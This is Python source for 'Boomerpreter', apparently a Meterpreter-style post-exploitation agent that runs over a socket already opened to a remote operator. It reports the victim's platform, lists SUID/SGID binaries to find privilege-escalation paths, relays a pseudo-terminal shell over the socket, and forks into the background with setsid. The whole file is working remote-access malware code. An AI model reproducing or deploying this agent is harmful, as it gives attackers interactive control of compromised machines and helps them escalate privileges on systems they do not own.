import subprocess
import socket
from platform import python_version
import glob
import stat
import os
import sys
import time
import threading
import platform

try:
    import pty
    has_pty = True
except:
    has_pty = False

try:
    import termios
    has_termios = True
except:
    has_termios = False


class Boomerpreter:
    def __init__(self,s):
        self.socket = s
        self.channel = None
        self.platform_os = platform.platform()
        self.py_version = 3 if python_version().startswith("3") else 2
        self.options = {
        "suid_sgid": ["get_suid_sgid", True],
        "exit": ["exit", False],
        "shell": ["get_shell", False]
        }

    def run(self):
        self.socket.send(self.platform_os.encode())
        while True:
            data_rcv = self.socket.recv(1024)
            data_rcv = data_rcv.split()
            try:
                opt = self.options[data_rcv[0]]
                if opt:
                    if opt[1]:
                        if len(data_rcv) > 1:
                            data = getattr(self, opt[0])(data_rcv[1])
                        else:
                            data = b"Error"
                    else:
                        data = getattr(self, opt[0])()
            except Exception as e:
                data = b"Error"
            if not data:
                continue
            if "exit" == data:
                break
            self.send_data(data)

    def recv_data(self):
        data = self.socket.recv(1024)
        if self.py_version == 3:
            data = data.encode()
        return data
    
    def send_data(self, data):
        if self.py_version == 3:
            data = data.encode()
        self.socket.send(data)

    def get_suid_sgid(self, request):
        my_dir = request
        files_suid = []
        files_sgid = []
        for f in os.listdir(my_dir):
            aux_file = os.path.join(my_dir, f)
            if os.path.isfile(aux_file):
                result = self._is_suid_sgid(aux_file)
                if result[0]:
                    files_suid.append(result[0])
                if result[1]:
                    files_sgid.append(result[1])
        files_suid = "\n".join(files_suid)
        files_sgid = ";".join(files_sgid)
        files = "---SUID---\n" +files_suid + "\n---SGID---\n" + files_sgid
        response = files
        return response

    def _is_suid_sgid(self, file_name):
        results = []
        try:
            f = os.stat(file_name)
            mode = f.st_mode
        except:
            return [None, None]
        if (mode & stat.S_ISUID) == 2048:
            results.append(file_name)
        else:
            results.append(None)
        if (mode & stat.S_ISGID) == 1024:
            results.append(file_name)
        else:
            results.append(None)
        return results
    
    def exit(self):
        self.socket.close()
        return "exit"
    
    def get_shell(self, request="/bin/sh"):
        if has_pty:
            cmd = ['/bin/sh', '-c', request] 
            master, slave = pty.openpty()
            if has_termios:
                settings = termios.tcgetattr(master)
                settings[3] = settings[3] & ~termios.ECHO
                termios.tcsetattr(master, termios.TCSADRAIN, settings)
            channel = STDProcess(cmd, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
            channel.stdin = os.fdopen(master, 'wb')
            channel.stdout = os.fdopen(master, 'rb')
            channel.stderr = open(os.devnull, 'rb')
            channel.start()
            read = True
            while True:
                if not read:
                    recv = self.socket.recv(1024)
                    if len(recv) == 0:
                        break
                    if "exit" in recv:
                        return None
                    channel.write(recv)
                read = False
                data = bytes()
                if channel.stderr_reader.is_read_ready():
                    data = channel.stderr_reader.read()
                elif channel.stdout_reader.is_read_ready():
                    data = channel.stdout_reader.read()
                elif channel.poll() != None:
                    self.socket.send(b"bye")
                    return None
                if data:
                    self.socket.sendall(data)
                else:
                    read = True
                time.sleep(1)
        else:
            return "No"

#Thanks Metasploit
class STDProcessBuffer(threading.Thread):
    def __init__(self, std, is_alive):
        threading.Thread.__init__(self)
        self.std = std
        self.is_alive = is_alive
        self.data = bytes()
        self.data_lock = threading.RLock()

    def run(self):
        for byte in iter(lambda: self.std.read(1), bytes()):
            self.data_lock.acquire()
            self.data += byte
            self.data_lock.release()

    def is_read_ready(self):
        return len(self.data) != 0

    def peek(self, l = None):
        data = bytes()
        self.data_lock.acquire()
        if l == None:
            data = self.data
        else:
            data = self.data[0:l]
        self.data_lock.release()
        return data

    def read(self, l = None):
        self.data_lock.acquire()
        data = self.peek(l)
        self.data = self.data[len(data):]
        self.data_lock.release()
        return data

#Thanks Metasploit
class STDProcess(subprocess.Popen):
    def __init__(self, *args, **kwargs):
        subprocess.Popen.__init__(self, *args, **kwargs)
        self.echo_protection = False

    def start(self):
        self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
        self.stdout_reader.start()
        self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
        self.stderr_reader.start()

    def write(self, channel_data):
        self.stdin.write(channel_data)
        self.stdin.flush()
        

address = s.getpeername()
if hasattr(os, 'fork'):
    pid = os.fork()
    if pid > 0:
        print("Meterpreter is running!") #test purposes
        sys.exit(0)

    if pid == 0:  
        if hasattr(os, 'setsid'):
            try:
                os.setsid()
            except OSError:
                pass


try:
    boomerpreter = Boomerpreter(s)
    boomerpreter.run()
except:
    pass